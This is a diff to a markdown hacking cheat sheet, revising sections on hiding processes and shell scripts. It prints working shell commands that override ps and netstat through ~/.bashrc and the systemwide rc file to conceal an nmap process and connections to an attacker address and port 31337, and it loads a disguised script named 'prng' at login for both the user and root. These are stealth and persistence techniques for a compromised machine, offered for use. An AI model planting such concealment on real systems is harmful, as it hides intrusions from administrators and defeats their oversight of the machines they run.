@@ -165,8 +165,9 @@ exec /usr/bin/netstat \"\$@\" | grep -Fv -e :22 -e 1.2.3.4" >/usr/local/sbin/net
 *(thank you iamaskid)*
 
 <a id="hide-a-process-user"></a>
+**1.v. Hide a process as user**
 
-Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our `grep` does not show up in the ps list by renaming it to GREP:
+Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our `grep` does not show up in the process list by renaming it to GREP:
 
 ```shell
 echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc
@@ -202,9 +203,9 @@ hide nohup sleep 1234 &>/dev/null &  # Starts and hides 'sleep 1234' as a backgr
 <a id="hide-scripts"></a>
 **1.vii. Hide shell scripts**
 
-Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use `source` instead. It is little known that the source command works can she shortened to `.` (yes, a dot) _and_ searches through the PATH variable to find the file to load.
+Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use `source` instead. It is little known that the source command can she shortened to `.` (yes, a dot) _and_ searches through the $PATH variable to find the file to load.
 
-In this example our script ```prng``` contains our shell functions to hide our network connection and nmap process. Last we add `. prng` into the user's .bashrc file to load our function on login:
+In this example our script ```prng``` contains all of our shell functions from above. Those functions hide the `nmap` process and the network connection. Last we add `. prng` into the systemwide rc file. This will load `prng` when the user (and root) logs in:
 
 ```shell
 echo -e "netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }
